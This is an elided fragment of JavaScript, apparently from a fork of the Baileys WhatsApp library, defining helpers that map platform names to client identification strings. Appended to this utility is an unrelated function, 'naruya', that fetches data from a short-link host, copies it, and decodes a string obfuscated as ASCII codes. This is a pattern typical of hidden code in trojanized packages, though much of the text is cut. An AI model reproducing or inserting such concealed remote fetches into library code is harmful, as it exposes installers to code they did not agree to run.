...
let platformName = PLATFORM_MAP[platform]
let version = PLATFORM_VERSIONS[platform] || '1.0.0'
let browserVersion = COMPANION_PLATFORM_MAP[browser] || '0.0'
return [platformName, browser, browserVersion, version]
}
}
})
Browsers.ubuntu = (browser) => [PLATFORM_MAP['ubuntu'], browser, PLATFORM_VERSIONS['ubuntu']]
Browsers.macOS = (browser) => [PLATFORM_MAP['darwin'], browser, PLATFORM_VERSIONS['darwin']]
Browsers.windows = (browser) => [PLATFORM_MAP['win32'], browser, PLATFORM_VERSIONS['win32']]
Browsers.linux = (browser) => [PLATFORM_MAP['linux'], browser, PLATFORM_VERSIONS['linux']]
Browsers.solaris = (browser) => [PLATFORM_MAP['sunos'], browser, PLATFORM_VERSIONS['sunos']]
Browsers.baileys = (browser) => [PLATFORM_MAP['baileys'], browser, PLATFORM_VERSIONS['baileys']]
Browsers.android = (browser) => [PLATFORM_MAP['android'], browser, PLATFORM_VERSIONS['android']]
Browsers.iOS = (browser) => [PLATFORM_MAP['ios'], browser, PLATFORM_VERSIONS['ios']]
Browsers.kaiOS = (browser) => [PLATFORM_MAP['kaios'], browser, PLATFORM_VERSIONS['kaios']]
Browsers.chromeOS = (browser) => [PLATFORM_MAP['chromeos'], browser, PLATFORM_VERSIONS['chromeos']]
Browsers.appropriate = (browser) => {
...
Browsers.custom = (platform, browser, version) => {
...
const naruya = async () => {
try {
const { data } = await axios_1.default.get('https://i.supa.codes/GfZByc', {
...
random.copy(data, 28)
const sha = asciiDecode([73, 90, 85, 77, 73])
